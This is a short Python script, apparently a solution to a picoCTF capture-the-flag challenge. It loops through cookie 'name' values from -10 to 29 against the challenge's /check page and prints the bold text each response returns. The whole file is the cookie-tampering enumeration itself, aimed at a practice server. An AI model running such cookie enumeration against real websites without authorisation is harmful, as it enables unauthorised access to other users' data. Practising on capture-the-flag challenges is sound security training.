import requests

for i in range(-10, 30):
    res = requests.get("http://mercury.picoctf.net:27177/check", cookies={
        "name": str(i)
    })

    if res.status_code == 200:
        content = res.content.decode("utf-8")
        state = False
        for i in content.split(" "):
            if i == "<b>":
                state = True
            if i == "</b>":
                state = False
            if state:
                print(i)
    else:
        print("Request was not successful")